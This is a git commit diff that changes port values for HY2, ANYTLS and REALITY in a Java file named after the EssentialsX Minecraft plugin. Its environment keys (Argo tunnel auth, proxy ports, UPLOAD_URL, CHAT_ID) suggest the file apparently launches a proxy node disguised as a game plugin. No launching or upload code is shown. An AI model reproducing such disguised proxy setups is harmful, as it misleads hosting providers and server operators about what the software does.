2d541b791a7752fe7ee45feefcdee0ff24630172
tabibalib-boop <tabibalib@gmail.com>
2026-03-03 19:56:37 +0300

    Update port numbers for HY2, ANYTLS, and REALITY

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -82,10 +82,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "25814");
+        env.put("HY2_PORT", "30210");
         env.put("TUIC_PORT", "");
-        env.put("ANYTLS_PORT", "25814");
-        env.put("REALITY_PORT", "25814");
+        env.put("ANYTLS_PORT", "30210");
+        env.put("REALITY_PORT", "30210");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
